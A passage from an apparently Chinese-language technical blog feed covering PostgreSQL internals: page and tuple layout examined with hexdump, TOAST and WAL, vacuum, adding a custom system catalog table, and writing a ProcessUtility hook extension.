class="line">39</span><br></pre></td></tr></table></figure><p>第一个Tuple偏移8152Byte;</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C 16406 -s 8152 -n 39</span><br></pre></td></tr></table></figure><p>itemidData-&gt;lp_len = 39;</p><p>t_hoff = 24; ==&gt; <code>hexdump -C 16406 -s 8152+22 -n 1</code></p><p>第一条Tuple元组信息 size = 39 - 24 = 15;</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Postgres$</span> hexdump -C 16406 -s 8152+t_hoff -n (itemidData-&gt;lp_len - t_hoff)</span><br><span class="line">01 00 00 00 13 31 20 20  20 20 20 20 20 05 61     |.....1       .a|</span><br><span class="line"></span><br><span class="line">回顾我们的表结构：</span><br><span class="line">create table pagetest (id int,c1 char(8),c2 varchar(16));</span><br><span class="line">第1个字段为int，第2个字段为定长字符，第3个字段为变长字符。</span><br><span class="line">相应的数据：</span><br><span class="line">id=\x00000001，数字1</span><br><span class="line">c1=\x133120202020202020，字符串，无需高低位变换，第1个字节\x13为标志位，后面是字符'1'+7个空格 ascii-&gt;hex;</span><br><span class="line">c2=\x0561，字符串，第1个字节\x05为标志位，后面是字符'a'</span><br></pre></td></tr></table></figure><p>那么第二条，则是, 因为实际数据申请，从文件向前申请。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C 16406 -s 8152+t_hoff-itemidData-&gt;lp_len -n 15</span><br><span class="line">==&gt;</span><br><span class="line">hexdump -C 16406 -s 8137 -n 15 </span><br><span class="line">00 00 00 13 32 20 20 20  20 20 20 20 05 62 00     |....2       .b.|</span><br></pre></td></tr></table></figure><p><strong>补充:</strong></p><p>Tuple中变长字段尤其需要注意，因为其保存大尺寸数据，很容易超过Page大小，Postgresql不允许一行数据跨Page存储。因此引入TOAST机制来处理。采用压缩 + 切片的方法将大数据分割成小数据，变成多行保存在对用的toast表中，并对它们进行索引。所以从文件角度来看，一行大数据可能被分割存在于多个数据文件中。(普通表与toast表分别对应的文件)。</p><p>查看Pagetest普通表与它的toast表:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# select oid, relname, relnamespace, relfilenode, reltablespace, relpages, reltuples, reltoastrelid, relkind from pg_class where relname = 'pagetest';</span><br><span class="line">  oid  | relname  | relnamespace | relfilenode | reltablespace | relpages | reltuples | reltoastrelid | relkind </span><br><span class="line"><span class="comment">-------+----------+--------------+-------------+---------------+----------+-----------+---------------+---------</span></span><br><span class="line"> 16406 | pagetest |         2200 |       16406 |             0 |        1 |         6 |             0 | r</span><br></pre></td></tr></table></figure><p>所有的toast表都在模式(schema)pg_toast下，查看toast表结构和数据:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">\d+  pg_toast.pg_toast_2606</span><br><span class="line">TOAST table "pg_toast.pg_toast_2606"</span><br><span class="line">   Column   |  Type   | Storage </span><br><span class="line"><span class="comment">------------+---------+---------</span></span><br><span class="line"> chunk_id   | oid     | plain</span><br><span class="line"> chunk_seq  | integer | plain</span><br><span class="line"> chunk_data | bytea   | plain</span><br><span class="line"></span><br><span class="line">Invalid command \. Try \? for help.</span><br></pre></td></tr></table></figure><ul><li>chunk_id  具有同样的chunk_id值得所有行组成原表的toast字段的一行数据。</li><li>chunk_seq 表示该行切片数据在完整数据中的顺序。</li><li>chunk_data 实际存储的切片数据。</li></ul><p>一张普通的表最多对应一张toast表，但是每个字段根据不同的数据类型具有不同的toast策略。修改toast策略，不会影响已有的数据存放方式。</p><ul><li>plain：不压缩，不切片。不会触发toast机制。</li><li>extended：优先压缩，后切片。</li><li>external：不压缩，只切片。用空间换时间的策略，提高操作效率。</li><li>main：尽量不切片。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# \d+ pagetest</span><br><span class="line">                              Table "public.pagetest"</span><br><span class="line"> Column |         Type          | Modifiers | Storage  | Stats target | Description </span><br><span class="line"><span class="comment">--------+-----------------------+-----------+----------+--------------+-------------</span></span><br><span class="line"> id     | integer               |           | plain    |              | </span><br><span class="line"> c1     | character(8)          |           | extended |              | </span><br><span class="line"> c2     | character varying(16) |           | extended |              | </span><br><span class="line">Indexes:</span><br><span class="line">    "pagetest_id_idx" brin (id)</span><br><span class="line">Replica Identity: FULL</span><br></pre></td></tr></table></figure><p>当将要保存到表的一行数据超过一个阈值(BLOCK/4 ~ 2KB)时，会触发toast机制，如果产生切片则保存到对应的toast表中。</p><p><br></p><h5 id="Pageinit"><a href="#Pageinit" class="headerlink" title="Pageinit"></a>Pageinit</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/pg_config.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLCKSZ 8192</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">PageInit(Page page, Size pageSize, Size specialSize) <span class="comment">//rocky_pageinit;</span></span><br><span class="line">&#123;</span><br><span class="line">PageHeaderp = (PageHeader) page;</span><br><span class="line"></span><br><span class="line">specialSize = MAXALIGN(specialSize);</span><br><span class="line"></span><br><span class="line">Assert(pageSize == BLCKSZ);</span><br><span class="line">Assert(pageSize &gt; specialSize + SizeOfPageHeaderData);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Make sure all fields of page are zero, as well as unused space</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MemSet(p, <span class="number">0</span>, pageSize);</span><br><span class="line"></span><br><span class="line">p-&gt;pd_lower = SizeOfPageHeaderData;</span><br><span class="line">p-&gt;pd_upper = pageSize - specialSize;</span><br><span class="line">p-&gt;pd_special = pageSize - specialSize;</span><br><span class="line">PageSetPageSizeAndVersion(page, pageSize, PG_PAGE_LAYOUT_VERSION);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h5 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a><strong>数据更新</strong></h5><p>数据更新的最终结果就是把变更的内容持久化到硬盘上。一次事务可能涉及多个page的改变。如果直接刷盘会产生多次随机写，付出的代价相对较高。所以在涉及层面采用写缓冲，异步和WAL来解决性能上的问题,并且WAL机制也保证了事务的持久性和数据的完整性，还使得在线备份和时间回复(PITR)称为可能。</p><p><br></p><h6 id="事务过程"><a href="#事务过程" class="headerlink" title="事务过程"></a><strong>事务过程</strong></h6><p>存储引擎在执行更新类操作时，首先开启事务，然后将变更后的内容记入Wal buffer, 并更新shared buffer中的page，最后提交事务，相应客户端。<br>shared buffer中的page发生更新后被标记为dirty page，之后由其他进程完成磁盘回写。<br>事务提交可以设置是否等待WAL记录被写入磁盘。控制参数为synchronous_commit。<br>设置off时对性能有一定提升,程序将不会等待本次WAL记录写入到磁盘，而直接影响客户端。</p><p><br></p><h6 id="WAL写入磁盘"><a href="#WAL写入磁盘" class="headerlink" title="WAL写入磁盘"></a>WAL写入磁盘</h6><p>默认情况下，WAL是在事务提交时写入磁盘。以保证提交的事务不会因为宕机而丢失。当synchronous_commit设置为off时，WAL写入磁盘的过程由Wal write进程异步完成，这种情况下宕机存在丢失最近提交的事务风险。但不会影响数据库的一致性。</p><p><img src="/img/postgresql/postgres-wal-fsync-disk.png" alt=""></p><p><br></p><h6 id="Dirty-Page回写磁盘"><a href="#Dirty-Page回写磁盘" class="headerlink" title="Dirty Page回写磁盘"></a>Dirty Page回写磁盘</h6><p>一般情况下，每隔一段时间writer进程就会扫描shared buffer, 将Dirty Page刷入操作系统的Page Cache，并记录处理过的Dirty Page,之后由系统内核处理page cache刷入磁盘，当空闲内存低于阈值 或 脏页驻留时间超过阈值时，触发回写磁盘。</p><p>另一种情况是由checkpointer进程定义执行checkpoint,强制当前处理过的dirty page回写磁盘，保证数据持久化，为事务前滚提供参照点。默认情况下(full_page_write = on), checkpoint发生后，在page第一次写的时候会将整个page写入WAL，以保证宕机或者备份拷贝时，产生的partial wirte page可以保证被正确的完整的page覆盖来修复。</p><p><img src="/img/postgresql/postgre-dirty_page_write.png" alt=""></p><p><br></p><h6 id="空间回收"><a href="#空间回收" class="headerlink" title="空间回收"></a>空间回收</h6><p>在PostgreSQL中，delete和一些的update(例如，涉及到索引字段的更新)会使表和索引中的旧行(tuple)被废弃掉。这些废弃的tuple称之为dead tuple，他们仍然占用空间，称为一种资源浪费。</p><p>PostgreSQL的VACUUM机制就是用来回收这些dead tuple空间的，用来回收利用。 </p><ul><li><p>Full Vacuum</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VACUUM FULL VERBOSE;</span><br><span class="line">VACUUM FULL t_user_info;</span><br><span class="line"><span class="keyword">ANALYZE</span>;</span><br></pre></td></tr></table></figure></li><li><p>Lazy Vacuum</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VACUUM t_user_info;</span><br><span class="line">VACUUM <span class="keyword">ANALYZE</span> t_user_info;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p><a href="http://www.postgres.cn/docs/10/storage-page-layout.html" target="_blank" rel="noopener">Postgresql 10 数据库文件布局</a></p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql开发-添加系统表</title>
      <link href="/2018/10/06/database/Postgresql%E5%BC%80%E5%8F%91-%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%A1%A8/"/>
      <url>/2018/10/06/database/Postgresql%E5%BC%80%E5%8F%91-%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>在修改pg_proc.h 的时候，发现只要在其中编写， 就会被BKI解析 生成到Postgres.bki文件中，用于initdb重建数据库。 从而被创建；</p><p>因此想:</p><p>是否可以直接在<code>include/catalong</code>下添加xxx.h文件，用于创建自己定义的数据表;</p><a id="more"></a><h4 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PG_ROCKY_AUDITINFO_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_ROCKY_AUDITINFO_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"catalog/genbki.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TableAuditRelationId  3294</span></span><br><span class="line"></span><br><span class="line">CATALOG(pg_auditinfo,<span class="number">3294</span>) </span><br><span class="line">&#123;</span><br><span class="line">Oiduser;<span class="comment">/* owner of tablespace */</span></span><br><span class="line">text        sql;</span><br><span class="line"></span><br><span class="line">&#125;FormData_pg_auditinfo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> FormData_pg_auditinfo* Form_pg_auditinfo;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Natts_pg_auditinfo    2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Anum_pg_auditinfo_user1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Anum_pg_auditinfo_sql2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>   <span class="comment">/* PG_TABLESPACE_H */</span></span></span><br></pre></td></tr></table></figure><p>其中Oid设置请运行 <code>include/catalong/unused_oids</code> 来查看未使用的Oid; </p><p><strong>注意格式: <code>backend/catalong/Makefile</code> 执行时，可能存在因为格式问题报错， 注意查看是否产生报错信息</strong></p><p>此时运行<code>make clean; make -j2</code> 发现，在postgre.bki 没有生成建立该表的信息。</p><h4 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h4><p>查看当前 postgre.bki当前目录下的Makefile即<code>backend/catalong/Makefile</code>发现有一个变量，用于提供BKI执行文件信息: <code>POSTGRES_BKI_SRCS</code></p><p>即我们在此变量中追加我们的文件名.  </p><p>再从新编译<code>make clean &amp; make</code>  将会在<code>postgres.bki</code>发现建表信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create pg_auditinfo <span class="number">3294</span></span><br><span class="line">(</span><br><span class="line">user = oid ,</span><br><span class="line">sql = text</span><br><span class="line">)</span><br><span class="line">open pg_auditinfo</span><br><span class="line">close pg_auditinfo</span><br></pre></td></tr></table></figure><p><code>initdb</code> 重新建立数据库，psql 连接后执行select语句我们将发现新建表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# select * from pg_auditinfo ;</span><br><span class="line"> user | sql </span><br><span class="line"><span class="comment">------+-----</span></span><br><span class="line">(0 rows)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="添加系统表声明"><a href="#添加系统表声明" class="headerlink" title="添加系统表声明"></a>添加系统表声明</h4><p>系统表选项: 仅用于声明;</p><ul><li>BKI_BOOTSTRAP </li><li>BKI_ROWTYPE_OID(oid) </li><li>BKI_WITHOUT_OIDS</li><li>BKI_SCHEMA_MACRO</li><li>BKI_SHARED_RELATION</li><li>BKI_FORCE_NULL</li><li>BKI_FORCE_NOT_NULL</li></ul><p><br></p><h4 id="系统表异常警告"><a href="#系统表异常警告" class="headerlink" title="系统表异常警告:"></a>系统表异常警告:</h4><p>系统表<code>insert into</code> 报错:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Postrgres=# insert into pg_auditinfo values(10, &apos;select * from dual;&apos;);</span><br><span class="line">WARNING:  01000: generating possibly-non-unique OID for &quot;pg_auditinfo&quot;</span><br><span class="line">WARNING:  01000: generating possibly-non-unique OID for &quot;pg_auditinfo&quot;</span><br></pre></td></tr></table></figure><p>解决: <code>include/catalog/indexing.h</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DECLARE_UNIQUE_INDEX(pg_auditinfo_oid_index, 3296, on pg_auditinfo using btree(oid oid_ops));</span><br><span class="line">#define AuditInfoOidIndexId 3296</span><br></pre></td></tr></table></figure><p>在其身上创建合适的索引，即可。</p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql扩展Sql-hook</title>
      <link href="/2018/09/29/database/Postgresql%E6%89%A9%E5%B1%95Sql-hook/"/>
      <url>/2018/09/29/database/Postgresql%E6%89%A9%E5%B1%95Sql-hook/</url>
      
        <content type="html"><![CDATA[<ul><li>基于PostgreSql  9.5.13</li></ul><p>在我们查看Postgresql源码时,经常发现Hook的使用. 例如:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PlannedStmt *</span><br><span class="line">planner(Query *parse, <span class="keyword">int</span> cursorOptions, ParamListInfo boundParams)</span><br><span class="line">&#123;</span><br><span class="line">PlannedStmt *result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (planner_hook)</span><br><span class="line">result = (*planner_hook) (parse, cursorOptions, boundParams); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">result = standard_planner(parse, cursorOptions, boundParams);</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Hook是Window消息处理机制的一个平台，应用程序可以在上面设置子程序以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。<br>当消息到达后，在目标窗口处理函数之前处理它, 钩子机制允许应用程序截获处理Window消息或特定事件。 即钩子先获取控制权,进行加工处理。<br>Postgresql中的Hook机制,更多是中断与替换操作。改变其标准流程。</p><p><br><br><a id="more"></a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Hook本质实际就是Static的函数指针。</p><p>工作原理：每个Hook是由全局性的函数指针构成的,其默认初始化值为NULL。 当数据库调用的时候，首先会检测是否为NULL, 不是则优先调用函数，否则执行标准函数。</p><p>Hook函数指针的值改变在于服务器启动，通过函数 <code>process_session_preload_libraries();</code> 加载共享库. 于<code>.so</code>寻找 <code>_PG_init</code> <code>_PG_fini</code> 函数,来进行函数初始化与卸载操作 [与其余插件区别在于:Hook插件有入口函数]。 在其具体操作流程，根据是否修改指定的Hook来参照是否中断或者更改其执行流程。</p><h4 id="共享库与初始化"><a href="#共享库与初始化" class="headerlink" title="共享库与初始化"></a>共享库与初始化</h4><p><code>shared_preload_libraries = &#39;&#39;</code>    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">guc.c 配置;</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="string">"shared_preload_libraries"</span>, PGC_POSTMASTER, CLIENT_CONN_PRELOAD, <span class="comment">//rocky_name with config; -- reload way</span></span><br><span class="line">gettext_noop(<span class="string">"Lists shared libraries to preload into server."</span>),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">GUC_LIST_INPUT | GUC_LIST_QUOTE | GUC_SUPERUSER_ONLY</span><br><span class="line">&#125;,</span><br><span class="line">&amp;shared_preload_libraries_string, <span class="comment">//-程序变量名;</span></span><br><span class="line"><span class="string">""</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fmgr/dfmgr.c:加载共享lib库,并执行其初始化;</span></span><br><span class="line">PG_init = (PG_init_t) pg_dlsym(file_scanner-&gt;handle, <span class="string">"_PG_init"</span>);</span><br><span class="line"><span class="keyword">if</span> (PG_init)</span><br><span class="line">    (*PG_init) (); </span><br><span class="line"></span><br><span class="line"><span class="comment">//fmgr/dfmgr.c:卸载lib库,移除hook 并 重置;</span></span><br><span class="line">PG_fini = (PG_fini_t) pg_dlsym(file_scanner-&gt;handle, <span class="string">"_PG_fini"</span>);</span><br><span class="line"><span class="keyword">if</span> (PG_fini)</span><br><span class="line">(*PG_fini) ();</span><br></pre></td></tr></table></figure><p><strong>设置函数指针:</strong><br>当数据库载入共享库时[设置share_preload_libiaries],首先会将其载入内存中,然后从共享库调用<code>_PG_init</code>, 通过此函数来加载自己的Hook函数; </p><p><code>contrib插件</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_PG_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    prev_proccessutility_hook = ProcessUtility_hook;  <span class="comment">//将我们定义的函数指针,指向Pg系统原有函数地址; 本身NULL; -- 起地址交换作用;</span></span><br><span class="line">    ProcessUtility_hook = record_oper_info; <span class="comment">//将系统指向我们需要其执行的函数;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>取消函数指针设置:</strong><br>    那么与之相对应的，你要写一个_PG_fini函数在卸载(drop extension xxxx)的时候使用,也就是移除你的hook并且把它重置为之前的指针值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_PG_fini(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ProcessUtility_hook = prev_proccessutility_hook; <span class="comment">//卸载lib库时,指向原有函数;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Postgresql-常见Hooks"><a href="#Postgresql-常见Hooks" class="headerlink" title="Postgresql 常见Hooks:"></a>Postgresql 常见Hooks:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> PGDLLIMPORT check_password_hook_type check_password_hook;     <span class="comment">//处理用户密码时调用的Hook, 可以对用户的密码进行限制,增加密码的规范.</span></span><br><span class="line"><span class="keyword">static</span> ExecutorStart_hook_type prev_ExecutorStart = <span class="literal">NULL</span>;            <span class="comment">//处理查询执行开始时调用的Hook;</span></span><br><span class="line"><span class="keyword">static</span> ExecutorRun_hook_type prev_ExecutorRun = <span class="literal">NULL</span>;                <span class="comment">//处理查询执行时调用的hook</span></span><br><span class="line"><span class="keyword">static</span> ExecutorFinish_hook_type prev_ExecutorFinish = <span class="literal">NULL</span>;          <span class="comment">//处理查询结束时调用的hook</span></span><br><span class="line"><span class="keyword">static</span> ExecutorEnd_hook_type prev_ExecutorEnd = <span class="literal">NULL</span>;                <span class="comment">//处理查询完成后调用的hook</span></span><br><span class="line"><span class="keyword">static</span> shmem_startup_hook_type prev_shmem_startup_hook = <span class="literal">NULL</span>;       <span class="comment">//在初始化共享内存是调用的hook  </span></span><br><span class="line"><span class="keyword">static</span> post_parse_analyze_hook_type prev_post_parse_analyze_hook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> object_access_hook_type next_object_access_hook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> ExecutorCheckPerms_hook_type next_exec_check_perms_hook = <span class="literal">NULL</span>; <span class="comment">//处理访问权限时调用的hook</span></span><br><span class="line"><span class="keyword">static</span> ProcessUtility_hook_type next_ProcessUtility_hook = <span class="literal">NULL</span>;       <span class="comment">//通用hook，可以处理很多的过程,。</span></span><br><span class="line"><span class="keyword">static</span> ClientAuthentication_hook_type next_client_auth_hook = <span class="literal">NULL</span>;    <span class="comment">//处理链接时调用的hook,可以对链接进行管理;</span></span><br><span class="line"><span class="keyword">static</span> needs_fmgr_hook_type next_needs_fmgr_hook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> fmgr_hook_type next_fmgr_hook = <span class="literal">NULL</span>;                           <span class="comment">//函数调用潜的hook</span></span><br></pre></td></tr></table></figure><h4 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h4><p><code>alter_oper.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//alter_oper.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"postgres.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fmgr.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tcop/utility.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _PG_init(<span class="keyword">void</span>);</span><br><span class="line"><span class="keyword">void</span> _PG_fini(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span></span><br><span class="line">ProcessUtility_hook_type prev_proccessutility_hook = <span class="literal">NULL</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">record_oper_info</span><span class="params">(Node *parsetree,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">const</span> <span class="keyword">char</span> *queryString, ProcessUtilityContext context,</span></span></span><br><span class="line"><span class="function"><span class="params">                       ParamListInfo params,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DestReceiver *dest, <span class="keyword">char</span> *completionTag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (nodeTag(parsetree))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> T_DropStmt:</span><br><span class="line">        <span class="keyword">case</span> T_DropTableSpaceStmt:</span><br><span class="line">        <span class="keyword">case</span> T_DropdbStmt:</span><br><span class="line">            ereport(NOTICE, (errmsg(<span class="string">"Drop ? it`s not allowd"</span>)));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    standard_ProcessUtility(parsetree, queryString,</span><br><span class="line">                            context, params,</span><br><span class="line">                            dest, completionTag);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">_PG_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    prev_proccessutility_hook = ProcessUtility_hook;  <span 